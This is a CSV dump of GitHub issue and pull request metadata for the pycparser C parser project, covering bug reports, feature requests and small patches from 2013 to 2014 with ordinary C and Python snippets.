eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/31,29849699,MDU6SXNzdWUyOTg0OTY5OQ==,31,"Handling error message from cpp  ""header toto.h not found"".",7014360,closed,FALSE,NA,NA,1,2014-03-20T19:21:35Z,2014-03-22T21:39:56Z,2014-03-22T21:39:56Z,NONE,NA,"Problem :
- pycparser analyse a c source file,
- the c source includes a header file, which doesn't exist. 

cpp print a message like ""header toto.h not found"", on the console.
But pycparser doesn't handle this message, and the analysis is done anyway.

Proposition :
- handle this kind of messages (read from stderr, when cpp is launch),
- create an exception to stop the pycparser analysis, and avoid a false analysis

Thanks for you help
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/31/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/31/comments,https://api.github.com/repos/eliben/pycparser/issues/31/events,https://github.com/eliben/pycparser/issues/31,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/30,29845169,MDU6SXNzdWUyOTg0NTE2OQ==,30,is pycparser thread-safe ?,7014360,closed,FALSE,NA,NA,1,2014-03-20T18:34:13Z,2014-03-22T21:34:07Z,2014-03-22T21:34:07Z,NONE,NA,"I would like to use pycparser with the new lib concurrent.futures, from python 3.2.

Is-it safe ?
Some requirements to avoid problems ?

Thanks for your help
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/30/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/30/comments,https://api.github.com/repos/eliben/pycparser/issues/30/events,https://github.com/eliben/pycparser/issues/30,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/29,29559870,MDU6SXNzdWUyOTU1OTg3MA==,29,Statement expressions,4418947,closed,FALSE,NA,NA,1,2014-03-17T13:29:33Z,2014-03-22T21:41:47Z,2014-03-22T21:41:47Z,NONE,NA,"The GNU compiler allows statements and declarations in expressions (see http://gcc.gnu.org/onlinedocs/gcc/Statement-Exprs.html). The ARM compiler supports these as well (see http://infocenter.arm.com/help/topic/com.arm.doc.faqs/ka14717.html). The pycparser currently can not deal with such expression (it report an error ""before: {"").
Although I guess this might be out of the current scope of the project, the fact that the two major compilers in the embedded world have this feature, makes a strong case for supporting such expressions also in pycparser, I believe. Therefore, I would like to ask for such a consideration.
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/29/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/29/comments,https://api.github.com/repos/eliben/pycparser/issues/29/events,https://github.com/eliben/pycparser/issues/29,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/28,29247793,MDU6SXNzdWUyOTI0Nzc5Mw==,28,Coord bug on FOR loops,6873361,closed,FALSE,NA,NA,2,2014-03-12T09:24:13Z,2014-03-15T21:06:10Z,2014-03-15T21:06:10Z,NONE,NA,"Hi Eli,

if you run pycparser (2.1, Python 2.7, Windows) over a loop such as:

```
for(int z=0; z<4; z++){
    // whatever here
}
```

you can see that there is a coord missing on the 'int z=0' (which is a DeclList) part:

```
>>> ast.show(showcoord=True)
DeclList:  (at None)
  Decl: z, [], [], [] (at /some/file.c:15)
    TypeDecl: z, [] (at /some/file.c:15)
      IdentifierType: ['int'] (at /some/file.c:15)
    Constant: int, 0 (at /some/file.c:15)
```

Is it a bug? Or a feature ? (I am not very familiar with coord detecting yet, but maybe there can be a reason of some sort, e.g. ""no one can guarantee that the DeclList will not span over several lines"", or even ""declaring an int after the very beginning of the function is not supposed to be supported by the grammar chosen for pycparser anyway"")
But in case it was not intended, I think this could be fixed in c_parser.py with:

```
    def p_iteration_statement_4(self, p):
        """""" iteration_statement : FOR LPAREN declaration expression_opt SEMI expression_opt RPAREN statement """"""
#        p[0] = c_ast.For(c_ast.DeclList(p[3]), p[4], p[6], p[8], self._coord(p.lineno(1)))
        p[0] = c_ast.For(c_ast.DeclList(p[3], self._coord(p.lineno(1))), p[4], p[6], p[8], self._coord(p.lineno(1)))    # fix
```

Tell me what you think about this.
Anyway, thanks for your valuable work on this parser :D
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/28/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/28/comments,https://api.github.com/repos/eliben/pycparser/issues/28/events,https://github.com/eliben/pycparser/issues/28,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/27,28313852,MDU6SXNzdWUyODMxMzg1Mg==,27,p_unified_wstring_literal crashes with builtin function does not have __getitem__,709517,closed,FALSE,NA,NA,2,2014-02-26T07:28:07Z,2014-03-15T21:12:08Z,2014-03-15T21:12:08Z,NONE,NA,"Hi Eli,
I love this library, thanks so much. I ran into an issue when trying to parse some code though. In c_parser.py, p_unified_wstring_literal has this line:
p[1].value = p[1].value.rstrip[:-1] + p[2][1:]

which crashed for me because the builtin function rstrip cannot be sliced. Is it possible you meant this:
p[1].value = p[1].value.rstrip()[:-1] + p[2][1:]

Or even perhaps p[2][2:]? I believe a test case for reproing this would be something like the following:
L""hi"" L""there"";

Thanks again.
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/27/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/27/comments,https://api.github.com/repos/eliben/pycparser/issues/27/events,https://github.com/eliben/pycparser/issues/27,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/26,27649631,MDExOlB1bGxSZXF1ZXN0MTI1ODM1MTk=,26,Awesome test feature,6690343,closed,FALSE,NA,NA,0,2014-02-15T14:07:58Z,2014-06-29T00:59:08Z,2014-02-15T14:36:56Z,NONE,NA,"Awesome
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/26/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/26/comments,https://api.github.com/repos/eliben/pycparser/issues/26/events,https://github.com/eliben/pycparser/pull/26,https://api.github.com/repos/eliben/pycparser/pulls/26
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/25,27084939,MDExOlB1bGxSZXF1ZXN0MTIyODczMjI=,25,fix for issue #24,718903,closed,FALSE,NA,NA,1,2014-02-06T21:16:22Z,2014-06-17T07:00:07Z,2014-02-08T13:55:27Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/25/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/25/comments,https://api.github.com/repos/eliben/pycparser/issues/25/events,https://github.com/eliben/pycparser/pull/25,https://api.github.com/repos/eliben/pycparser/pulls/25
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/24,26850433,MDU6SXNzdWUyNjg1MDQzMw==,24,CGenerator.visit_ExprList curly braces instead of parentheses for sub-expression-lists,718903,closed,FALSE,NA,NA,0,2014-02-04T00:27:28Z,2014-08-27T20:53:24Z,2014-03-01T15:37:19Z,CONTRIBUTOR,NA,"In c_generator.py, CGenerator.visit_ExprList prints sub-expression-lists enclosed in curly-braces instead of round parentheses. The C spec doesn't allow this afaik and neither does the grammar defined in _c_ast.cfg.

Example:

> >>> from pycparser import c_ast
> >>> from pycparser import c_generator
> >>> gen = c_generator.CGenerator()
> >>> e1 = c_ast.Assignment('=', c_ast.ID('a'), c_ast.ID('b'))
> >>> e2 = c_ast.Assignment('=', c_ast.ID('b'), c_ast.ID('c'))
> >>> e3 = c_ast.Assignment('=', c_ast.ID('c'), c_ast.ID('a'))
> >>> el1 = c_ast.ExprList([e2, e3])
> >>> el = c_ast.ExprList([e1, el1])
> >>> gen.visit(el)
> 'a = b, {b = c, c = a}'

Should be:

> 'a = b, (b = c, c = a)'  # <-- '(' and ')' instead of '{' and '}'

This causes such expressions generated by CGenerator to no longer be parsed by CParser (as mentioned the _c_ast.cfg file doesn't consider compound statements as expressions).

Workaround for users (and potential fix):

> class FixedCGenerator(c_generator.CGenerator):
> 
> &nbsp;&nbsp;&nbsp;&nbsp;def **init**(self):
> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;super(FixedCGenerator, self).**init**()
> 
> &nbsp;&nbsp;&nbsp;&nbsp;def visit_ExprList(self, n):
> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;visited_subexprs = []
> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for expr in n.exprs:
> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if isinstance(expr, c_ast.ExprList):
> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;visited_subexprs.append('(' + self.visit(expr) + ')')
> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:
> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;visited_subexprs.append(self.visit(expr))
> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return ', '.join(visited_subexprs)

// wayrick

P.S. I really like this module (much easier to use than clang :) )
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/24/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/24/comments,https://api.github.com/repos/eliben/pycparser/issues/24/events,https://github.com/eliben/pycparser/issues/24,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/23,26130179,MDExOlB1bGxSZXF1ZXN0MTE3ODAxNDQ=,23,"allow ""static"" in array parameters (GH issue #21)",1429028,closed,FALSE,NA,NA,0,2014-01-22T22:50:18Z,2014-06-25T06:56:16Z,2014-01-25T14:07:14Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/23/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/23/comments,https://api.github.com/repos/eliben/pycparser/issues/23/events,https://github.com/eliben/pycparser/pull/23,https://api.github.com/repos/eliben/pycparser/pulls/23
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/22,25728538,MDExOlB1bGxSZXF1ZXN0MTE1Nzk5MDU=,22,Add missing C99 integer types,1429028,closed,FALSE,NA,NA,0,2014-01-16T14:34:41Z,2014-06-13T08:41:29Z,2014-01-18T14:39:56Z,CONTRIBUTOR,NA,"This adds some missing integer typedefs, defined in
http://www.iso-9899.info/n1256.html#7.18.1.2 and following.
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/22/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/22/comments,https://api.github.com/repos/eliben/pycparser/issues/22/events,https://github.com/eliben/pycparser/pull/22,https://api.github.com/repos/eliben/pycparser/pulls/22
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/21,25727828,MDU6SXNzdWUyNTcyNzgyOA==,21,Can't parse array parameter with 'static',1429028,closed,FALSE,NA,NA,2,2014-01-16T14:23:09Z,2014-01-25T14:31:47Z,2014-01-25T14:31:47Z,CONTRIBUTOR,NA,"The following code results in a ParseError, even though it is valid C99, according to http://www.iso-9899.info/n1256.html#6.7.5.3p7

```
from pycparser.c_parser import CParser
CParser().parse('void f(int x[static 10]);')
```
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/21/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/21/comments,https://api.github.com/repos/eliben/pycparser/issues/21/events,https://github.com/eliben/pycparser/issues/21,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/20,24889376,MDExOlB1bGxSZXF1ZXN0MTExNDI3OTk=,20,Run post install task executing _build_tables,346079,closed,FALSE,NA,NA,0,2013-12-30T16:10:51Z,2014-06-26T10:36:37Z,2013-12-30T18:44:11Z,CONTRIBUTOR,NA,"Add a post install task to execute `_build_tables.py` in the install
destination. This avoid avoids `lextab.py` and `yacctab.py` files
being created where pycparser is used when installing from source and
forgetting to run `_build_tables.py` manually. As an added bonus,
also run `_build_tables.py` automatically when building a source or
binary distribution.
- Add post install task executing _build_tables in install destination
- Use distutils execute for building tables to respect dry_run flag
- Use setuptools if available, fall back to distutils if not
- Name the overriden class install to get the right help text
- Also run _build_tables when creating a source distribution
- No more need to run _build_tables.py manually

Closes #5
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/20/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/20/comments,https://api.github.com/repos/eliben/pycparser/issues/20/events,https://github.com/eliben/pycparser/pull/20,https://api.github.com/repos/eliben/pycparser/pulls/20
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/19,24330213,MDU6SXNzdWUyNDMzMDIxMw==,19,pycparser accepts parseable but nonsensical declaration,4315061,closed,FALSE,NA,NA,1,2013-12-16T04:56:20Z,2013-12-27T00:02:35Z,2013-12-27T00:02:35Z,NONE,NA,"``` c
void (*fptrs)(void)[4];
```

While this successfully parses, you can't have an array of void. It might be worth considering special casing this as invalid, because any C frontend would reject it, and it means that anything using pycparser that doesn't check for it will return funny results. pycparser's cdecl implementation, for example, accepts it without warnings:

```
fp is a pointer to function(void) returning array[4] of void
```

Compare to original cdecl:

```
cdecl> explain void (*fptrs)(void)[4];
Warning: Unsupported in C -- 'array of type void'
        (maybe you mean ""array of type pointer to void"")
declare fptrs as pointer to function (void) returning array 4 of void
```
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/19/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/19/comments,https://api.github.com/repos/eliben/pycparser/issues/19/events,https://github.com/eliben/pycparser/issues/19,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/18,22846020,MDU6SXNzdWUyMjg0NjAyMA==,18,pycparser.plyparser.ParseError: /usr/lib/gcc/x86_64-redhat-linux/4.8.2/include/stdarg.h:40:27: before: __gnuc_va_list,3856993,closed,FALSE,NA,NA,1,2013-11-18T16:02:41Z,2013-11-19T13:41:50Z,2013-11-19T13:41:50Z,NONE,NA,"I tryed to parse the simple program:

``` C
#include <stdio.h>

#define MY_AGO 21.5

/*
 * Главная функция программы.
 *
 * На входе: argc - количество параметров командной строки
 *           argv - аргументы командрной строки
 *
 * На выходе: 0 - успешное завершение программы
 */
int main(int argc, char **argv) {
    printf(""Hello, World!\n"");
    printf(""I am %d ago.\n"", MY_AGO);
    printf(""You can use \""//\"" for one-line comments\n"");
    return 0;
}
```

I used C preprocessor cpp before pycparser

```
cpp -std=c99 ./input.c ./output.c
```

And I got follow error:

```
Traceback (most recent call last):
  File ""/home/osanve/PycharmProjects/MyProject/src/main.py"", line 118, in <module>
    ast = parser.parse(text, filename='<none>')
  File ""/usr/lib/python2.7/site-packages/pycparser/c_parser.py"", line 138, in parse
    debug=debuglevel)
  File ""/usr/lib/python2.7/site-packages/pycparser/ply/yacc.py"", line 265, in parse
    return self.parseopt_notrack(input,lexer,debug,tracking,tokenfunc)
  File ""/usr/lib/python2.7/site-packages/pycparser/ply/yacc.py"", line 1047, in parseopt_notrack
    tok = self.errorfunc(errtoken)
  File ""/usr/lib/python2.7/site-packages/pycparser/c_parser.py"", line 1613, in p_error
    column=self.clex.find_tok_column(p)))
  File ""/usr/lib/python2.7/site-packages/pycparser/plyparser.py"", line 54, in _parse_error
    raise ParseError(""%s: %s"" % (coord, msg))
pycparser.plyparser.ParseError: /usr/lib/gcc/x86_64-redhat-linux/4.8.2/include/stdarg.h:40:27: before: __gnuc_va_list
```
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/18/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/18/comments,https://api.github.com/repos/eliben/pycparser/issues/18/events,https://github.com/eliben/pycparser/issues/18,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/17,19762773,MDU6SXNzdWUxOTc2Mjc3Mw==,17,"Add support for `__attribute__`, `__inline`, `__asm pragmas`",618125,closed,FALSE,NA,NA,3,2013-09-19T15:40:54Z,2013-09-20T12:27:40Z,2013-09-20T04:19:21Z,NONE,NA,"Code containing the `__attribute__`, `__inline`,`__asm` pragmas makes the CParser module croak. Maybe the CParser module can silently ignore unknown pragmas?
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/17/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/17/comments,https://api.github.com/repos/eliben/pycparser/issues/17/events,https://github.com/eliben/pycparser/issues/17,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/16,19762648,MDU6SXNzdWUxOTc2MjY0OA==,16,Implement implicit typedefs,618125,closed,FALSE,NA,NA,5,2013-09-19T15:38:52Z,2013-12-27T00:03:18Z,2013-12-27T00:03:18Z,NONE,NA,"Hi,

Instead of having a fake libc with a whole bunch of typedefs why not implement a catchall rule that just typedefs an unknown storage type to an int or something else that would indicate to the user that the storage type was unresolvable?

This would increase portability as a lot of OSes have really weird storage types in their libc implementations like Darwin, for example. It would also get rid of the fake_libc requirement completely.
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/16/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/16/comments,https://api.github.com/repos/eliben/pycparser/issues/16/events,https://github.com/eliben/pycparser/issues/16,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/15,19621012,MDU6SXNzdWUxOTYyMTAxMg==,15,Walk through AST,1074954,closed,FALSE,NA,NA,1,2013-09-17T15:20:26Z,2013-09-17T16:31:14Z,2013-09-17T16:31:14Z,NONE,NA,"May be I need to get a close look at your project, but I didn't find how to walk through generated AST.
I mean if there any way to do something like that:

```
ast = parser.parse(text, filename='<none>')
for i in run_through(ast):
    if i.name == ""If"":
        print(""Match!"")
```
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/15/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/15/comments,https://api.github.com/repos/eliben/pycparser/issues/15/events,https://github.com/eliben/pycparser/issues/15,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/14,17879292,MDExOlB1bGxSZXF1ZXN0NzUxMzA2MQ==,14,Run build tables post install and when building source or binary distribution,346079,closed,FALSE,NA,NA,7,2013-08-09T18:49:49Z,2014-07-04T18:20:35Z,2013-12-28T16:40:34Z,CONTRIBUTOR,NA,"Add a post install task to execute `_build_tables.py` in the install destination. This avoid avoids `lextab.py` and `yacctab.py` files being created where pycparser is used when installing from source and forgetting to run `_build_tables.py` manually. As an added bonus, also run `_build_tables.py` automatically when building a source or binary distribution.

Closes #5
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/14/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/14/comments,https://api.github.com/repos/eliben/pycparser/issues/14/events,https://github.com/eliben/pycparser/pull/14,https://api.github.com/repos/eliben/pycparser/pulls/14
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/13,17793347,MDExOlB1bGxSZXF1ZXN0NzQ2OTM4NQ==,13,Locate test data from __file__,442117,closed,FALSE,NA,NA,0,2013-08-08T07:46:44Z,2014-06-13T11:28:44Z,2013-12-26T23:58:21Z,CONTRIBUTOR,NA,"Find c_files and fake_libc_include from `__file__` of the unit test,
rather than expecting the test suite to be run from a particular
directory.
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/13/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/13/comments,https://api.github.com/repos/eliben/pycparser/issues/13/events,https://github.com/eliben/pycparser/pull/13,https://api.github.com/repos/eliben/pycparser/pulls/13
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/12,17066657,MDU6SXNzdWUxNzA2NjY1Nw==,12,"Fedora patch, order of entries in system paths for _build_tables.py",441438,closed,FALSE,NA,NA,1,2013-07-22T19:46:07Z,2013-07-24T12:48:11Z,2013-07-24T12:48:11Z,NONE,NA,"Basically the idea as issue 11; if there is already a pycparser package installed on the system, _build_tables.py fails because of the path order.

diff -up pycparser-release_v2.09.1/pycparser/_build_tables.py.tables-sys-path p\
ycparser-release_v2.09.1/pycparser/_build_tables.py  
--- pycparser-release_v2.09.1/pycparser/_build_tables.py.tables-sys-path       \
 2013-07-22 13:17:44.950531002 -0600  
+++ pycparser-release_v2.09.1/pycparser/_build_tables.py        2013-07-22 13:1\
8:29.188526142 -0600  
@@ -17,7 +17,7 @@ ast_gen = ASTCodeGenerator('_c_ast.cfg')
 ast_gen.generate(open('c_ast.py', 'w'))                                        

 import sys  
-sys.path.extend(['.', '..'])  
+sys.path[0:0] = ['.', '..']  
 from pycparser import c_parser                                                 

 # Generates the tables                                                         
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/12/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/12/comments,https://api.github.com/repos/eliben/pycparser/issues/12/events,https://github.com/eliben/pycparser/issues/12,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/11,17065840,MDU6SXNzdWUxNzA2NTg0MA==,11,"Fedora patch, order of entries in system paths for unit testing",441438,closed,FALSE,NA,NA,2,2013-07-22T19:27:52Z,2013-07-24T12:45:53Z,2013-07-24T12:45:53Z,NONE,NA,"We needed this patch to package PyCParser for Fedora; you might to include it:
# HG changeset patch
# User Scott Tsai scottt.tw@gmail.com
# Date 1358446261 -28800
# Node ID 12aa73c5da595a08f587c14a74e84bf72f0bf7a0
# Parent  a46039840b0ed8466bebcddae9d4f1df60d3bc98

tests/all_tests.py: add local paths to the front of sys.path

While doing pycparser development on a machine that already has an
older version of pycparser installed, we want unit tests to run against
the local copy instead of the system wide copy of pycparser.
This patch adds '.' and '..' to the front of sys.path instead of the back.

diff --git a/tests/all_tests.py b/tests/all_tests.py
--- a/tests/all_tests.py
+++ b/tests/all_tests.py
@@ -1,7 +1,7 @@
 #!/usr/bin/env python

 import sys
-sys.path.extend(['.', '..'])
+sys.path[0:0] = ['.', '..']

 import unittest
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/11/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/11/comments,https://api.github.com/repos/eliben/pycparser/issues/11/events,https://github.com/eliben/pycparser/issues/11,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/10,16829317,MDExOlB1bGxSZXF1ZXN0Njk2NDczMg==,10,Python 2.5 Backwards Compatibility,4564403,closed,FALSE,NA,NA,5,2013-07-16T19:42:00Z,2014-06-22T08:59:41Z,2013-07-17T12:46:04Z,NONE,NA,"Added code to setup.py to copy and modify the .py source files to make
them Python 2.5-compatible. A ""from **future** import with_statement""
line is added at the top of each file, and the ""except ExceptionType as
varname"" syntax is converted to the obsolete ""except ExceptionType,
varname"" syntax.
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/10/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/10/comments,https://api.github.com/repos/eliben/pycparser/issues/10/events,https://github.com/eliben/pycparser/pull/10,https://api.github.com/repos/eliben/pycparser/pulls/10
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/9,16228725,MDU6SXNzdWUxNjIyODcyNQ==,9,Syntax Errors reported by pycparser but not gcc,10137,closed,FALSE,NA,NA,2,2013-07-01T18:39:26Z,2013-07-02T15:50:33Z,2013-07-02T15:50:33Z,NONE,NA,"The following code generates no warnings or errors when compiled with gcc with a large number of warning options, yet pycparser reports a syntax error.  #includes omitted.

int main()
{
       int i = 5, j = 6, k = 1;
       if ((i=j && k == 1) || k > j)
                printf(""Hello, World\n"");
       return 0;
}
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/9/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/9/comments,https://api.github.com/repos/eliben/pycparser/issues/9/events,https://github.com/eliben/pycparser/issues/9,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/8,15905493,MDU6SXNzdWUxNTkwNTQ5Mw==,8,Not able to parse structure variables having the same name as a user defined type using typedef,4634435,closed,FALSE,NA,NA,2,2013-06-24T01:30:50Z,2013-07-13T13:54:14Z,2013-07-13T13:54:14Z,NONE,NA,"Consider the below structure,

typedef struct
{
int number;
}Number;

struct XYZ
{
Number Number[10];
}xyz;

PyCParser is not able to parse the 2nd structure, its complaining about Number[10]. The above is a valid C declaration.
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/8/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/8/comments,https://api.github.com/repos/eliben/pycparser/issues/8/events,https://github.com/eliben/pycparser/issues/8,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/7,15719472,MDU6SXNzdWUxNTcxOTQ3Mg==,7,Please push tags from the bitbucket repo,504287,closed,FALSE,NA,NA,1,2013-06-18T23:43:46Z,2013-06-19T12:43:19Z,2013-06-19T12:43:19Z,NONE,NA,"The github repo has no release tags. Please bring these over.
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/7/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/7/comments,https://api.github.com/repos/eliben/pycparser/issues/7/events,https://github.com/eliben/pycparser/issues/7,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/6,15547998,MDU6SXNzdWUxNTU0Nzk5OA==,6,No error message on pointer multiplication,1928411,closed,FALSE,NA,NA,1,2013-06-14T08:40:44Z,2013-06-14T14:27:52Z,2013-06-14T14:27:52Z,NONE,NA,"Hello,
I'm evaluating some C Parser librarys and I have a question:
Pycparser doesnt report errors on pointer mulitplication. Are those extended error checking features planned?

int main(void)
{
        int _a, *b;
        a=a_b;
}
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/6/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/6/comments,https://api.github.com/repos/eliben/pycparser/issues/6/events,https://github.com/eliben/pycparser/issues/6,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/5,15364928,MDU6SXNzdWUxNTM2NDkyOA==,5,Necessity of PLY's table files,4551516,closed,FALSE,NA,NA,3,2013-06-10T19:42:39Z,2013-12-30T16:10:51Z,2013-06-18T15:31:02Z,CONTRIBUTOR,NA,"In the past I've found it annoying that PLY creates lex/yacc table files from wherever you happen to run the script.  The same is happening with pycparser, so I investigated if these tables actually speed up execution at all with this _particular_ grammar.

I timed the execution of examples\cdecl.py over 50 runs, and found that removing the tables (https://github.com/Syeberman/pycparser/commit/c2187621698c3352cf4a703431061079b0a78de1) actually made execution _faster_: 44.77 seconds over the 50 runs without tables versus 47.44 with (with tables already written out).  (Win7 Intel Core i7-2600 @ 3.4GHz)

It seems David Beazley himself has also questioned the necessity of these tables, as recently as a year ago:
http://comments.gmane.org/gmane.comp.python.ply/636

The only benefit I see for these tables is to allow Python's optimized mode to be used:
http://www.dabeaz.com/ply/ply.html#ply_nn38
I tested with -O (after cleaning __pycache__) and it works just fine, but -OO does indeed fail.  More investigation would be needed if -OO support was necessary (perhaps there's a way to keep docstrings for certain modules).
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/5/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/5/comments,https://api.github.com/repos/eliben/pycparser/issues/5/events,https://github.com/eliben/pycparser/issues/5,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/4,15360187,MDExOlB1bGxSZXF1ZXN0NjIyNjUyNw==,4,Dollar signs in identifiers,4551516,closed,FALSE,NA,NA,0,2013-06-10T17:54:38Z,2014-07-10T18:55:03Z,2013-06-12T13:07:41Z,CONTRIBUTOR,NA,"While non-standard, this is supported by many compilers:
http://gcc.gnu.org/onlinedocs/gcc/Dollar-Signs.html
http://llvm.org/releases/1.4/docs/ReleaseNotes.html (""Dollar sign is allowed in identifiers"")
http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.dui0348c/Ciajabbe.html
",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/4/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/4/comments,https://api.github.com/repos/eliben/pycparser/issues/4/events,https://github.com/eliben/pycparser/pull/4,https://api.github.com/repos/eliben/pycparser/pulls/4
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/3,15359864,MDExOlB1bGxSZXF1ZXN0NjIyNjM2NA==,3,Fixed handling of some integer suffix corner cases,4551516,closed,FALSE,NA,NA,0,2013-06-10T17:47:20Z,2013-06-12T13:16:21Z,2013-06-12T13:06:23Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/3/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/3/comments,https://api.github.com/repos/eliben/pycparser/issues/3/events,https://github.com/eliben/pycparser/pull/3,https://api.github.com/repos/eliben/pycparser/pulls/3
